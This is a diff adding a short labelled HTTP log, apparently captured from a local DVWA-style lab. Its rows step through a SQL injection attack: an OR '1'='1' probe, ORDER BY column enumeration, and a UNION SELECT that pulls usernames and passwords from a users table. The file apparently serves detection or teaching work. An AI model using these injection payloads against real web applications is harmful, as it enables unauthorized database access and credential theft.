@@ -1,0 +1,6 @@
+ts,id.orig_h,id.resp_h,method,host,uri,status_code,datetime_utc,classification
+1794849515.67661,127.0.0.1,127.0.0.1,GET,127.0.0.1:8080,/vulnerabilities/sqli/?id=1&Submit=Submit,200,2026-11-16 17:18:35.676609993+00:00,Baseline (legitimate)
+1794849548.953253,127.0.0.1,127.0.0.1,GET,127.0.0.1:8080,/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit,200,2026-11-16 17:19:08.953253031+00:00,Injectability probe
+1794849567.884782,127.0.0.1,127.0.0.1,GET,127.0.0.1:8080,/vulnerabilities/sqli/?id=1'+ORDER+BY+2--+-&Submit=Submit,200,2026-11-16 17:19:27.884782076+00:00,Column enumeration
+1794849578.875882,127.0.0.1,127.0.0.1,GET,127.0.0.1:8080,/vulnerabilities/sqli/?id=1'+ORDER+BY+3--+-&Submit=Submit,200,2026-11-16 17:19:38.875881910+00:00,Column enumeration
+1794849607.511128,127.0.0.1,127.0.0.1,GET,127.0.0.1:8080,"/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,+password+FROM+users--+-&Submit=Submit",200,2026-11-16 17:20:07.511127949+00:00,UNION-based extraction
